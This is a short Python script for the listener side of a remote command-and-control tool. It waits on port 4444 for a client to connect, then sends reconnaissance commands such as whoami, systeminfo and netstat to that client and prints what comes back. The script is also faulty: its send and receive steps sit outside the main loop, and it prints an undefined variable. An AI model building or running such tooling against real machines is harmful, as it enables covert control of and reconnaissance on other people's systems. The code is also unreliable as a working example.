import os
import socket

SERVER_HOST = "IP"
SERVER_PORT = 4444 #port number


server = socket.socket()
server.bind((SERVER_HOST, SERVER_PORT))
print("[+] Server Start")
print("[+] Listening for Client Connection ...")
server.listen(3)
client, client_addr = server.accept()
print(f"[+] {client_addr} Client connected to the server")

#define ther available commands

commands  = {
    
    "ipconfig" : "Check client IP address",
    "dir" : "List directory contents",
    "tasklist" : "List current running process",
    "systeminfo" : "Show system information",
    "netstat" : "Print network connections",
    "whoami" : "Print current user info",
}



#print out the avaliable commands

print("Available commands")
for key , value in commands.items():
    print(f"{key}:{value}")
    
    
while 1 == 1:
    #get the user's command choice 
    
    command : str = input("\n Enter a command (type 'help' for options):")
    if command == "help":
        os.system('cls' if os.name == 'nt' else 'clear')
        print('Available commands:')
        for key , value in commands.items():
            print(f"{key}:{value}")
            pass
            
            
            
            
            
            
            
#verify that the command is vaild 

if command not in commands.keys():
    print("Invalid command .Enter 'help' for options.")
    pass
    
    
#send the command to the client 

command = command.encode()
client.send(command)
print('\n [+] Command sent \n ')




# recieved the output from the client and print it out 


out = client.recv(4096).decode()
os.system('cls' if os.name == 'nt' else 'clear')
print(f"Output : {output}")
